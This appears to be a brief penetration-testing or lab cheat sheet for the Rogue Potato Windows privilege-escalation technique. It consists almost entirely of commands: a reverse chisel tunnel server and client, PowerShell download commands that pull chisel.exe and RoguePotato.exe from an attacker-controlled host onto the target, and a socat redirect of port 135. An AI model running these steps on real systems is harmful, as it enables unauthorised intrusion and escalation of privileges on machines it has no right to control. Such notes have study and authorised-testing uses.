# Rogue Potato

setup chisel - server and client

```text
sudo ./chisel server -p 9001 --reverse

invoke-webrequest -uri 'http://10.10.14.28/chisel.exe' -outfile chisel.exe
.\chisel.exe client 10.10.14.28:9001 R:9999:127.0.0.1:9999
```



```text
socat tcp-listen:135,reuseaddr,fork tcp:127.0.0.1:9999
```

download rogue potato to the windows box

```text
invoke-webrequest -uri 'http://10.10.14.28/RoguePotato.exe' -outfile .\rp.exe
```



